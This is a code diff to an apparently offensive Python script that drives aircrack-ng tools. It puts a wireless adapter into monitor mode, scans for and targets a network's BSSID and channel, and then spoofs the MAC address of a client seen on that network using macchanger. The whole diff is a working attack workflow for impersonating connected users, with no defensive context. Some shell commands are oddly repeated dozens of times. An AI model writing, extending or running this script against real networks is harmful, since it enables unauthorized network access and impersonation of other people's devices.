@@ -93,6 +93,9 @@ kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"
 # Put wireless interface in Monitored mode
 print("Putting Wifi adapter into monitored mode:")
 put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", iface])
+os.system (f'ifconfig {iface} down')
+os.system (f'iwconfig {iface} mode monitor')
+os.system (f'ifconfig {iface} up')
 
 # Discover access points
 discover_access_points = os.system("screen -d -m sudo airodump-ng -w file --write-interval 1 --output-format csv" + ' ' + iface)
@@ -147,9 +150,12 @@ targetchannel = active_wireless_networks[int(choice)]["channel"].strip()
 os.system ('airmon-ng start ' + iface + ' ' + targetchannel)
 os.system ('airodump-ng -c ' + targetchannel + ' --bssid ' + targetbssid  + ' ' + iface)
 
-macspoof = input('Please Enter Mac Address That You Want To Spoof : ')
-os.system (f'ifconfig {iface} down')
-os.system (f'macchanger -m {macspoof} {iface}')
-os.system (f'ifconfig {iface} up')
+macspoof = input("\nClients MAC Addresses Shows In The Station Tab. If It's Empty Then Run The Script Again And Wait Someone To Show Up\n\nPlease Enter Mac Address That You Want To Spoof : ")
+
 os.system (f'screen -d -m airmon-ng stop {iface}')
+os.system (f'ifconfig {iface} down')
+os.system (f'screen -d -m iwconfig {iface} mode auto\n'*10)
+os.system (f'screen -d -m macchanger -m {macspoof} {iface}\n'*100)
+os.system (f'ifconfig {iface} up')
 os.system ('service NetworkManager restart')
+os.system (f'macchanger -s {iface}')
